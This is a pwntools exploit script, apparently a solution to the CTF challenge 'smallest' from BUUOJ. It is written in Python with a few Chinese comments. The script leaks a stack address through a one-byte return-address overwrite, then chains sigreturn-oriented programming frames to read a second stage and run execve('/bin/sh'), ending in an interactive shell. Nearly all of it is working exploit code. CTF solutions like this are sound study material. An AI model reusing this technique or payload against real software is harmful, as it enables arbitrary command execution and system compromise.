from pwn import *
#from LibcSearcher import *
import time
context(log_level='debug',os='linux',arch='amd64')
pwnfile = './smallest'
io=process(pwnfile)
#io=remote('node4.buuoj.cn',29605)
elf = ELF(pwnfile)
def debug():
	gdb.attach(io,"b *0x4000B0")
	pause()

debug()

syscall = 0x04000BE
start_adr = 0x04000B0

io.sendline(p64(start_adr)*3)

io.send(b'\xB3')	#read_sys收到一字节，所rax此时为1
#返回地址被修改为0xB3结尾  越过了将rax置0,此时会执行write_sys

stack_adr = u64(io.recv()[8:16])
print("stack_adr--->",hex(stack_adr))
rx_adr = stack_adr & 0xfffffffffffffff000
rx_adr = rx_adr - 0x2000
print("rx_adr--->",hex(rx_adr))

#debug()

frame = SigreturnFrame() 
frame.rax = 0
frame.rdi = 0
frame.rsi = rx_adr
frame.rdx = 0x400
frame.rip = start_adr
frame.rsp = rx_adr

pay = p64(start_adr)+b'a'*8+bytes(frame)
io.send(pay)
yes = raw_input()
pay = p64(syscall) + b'c'*7
io.send(pay)
yes = raw_input()

frame = SigreturnFrame() 
frame.rax = 59
frame.rdi = rx_adr + 0x120
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall
frame.rsp = rx_adr

pay = p64(start_adr)+b'a'*8+bytes(frame)
pay = pay.ljust(0x120,b'a')
pay += b'/bin/sh\x00'
io.send(pay)

pay = p64(syscall)+b'c'*7
io.send(pay)

io.interactive()

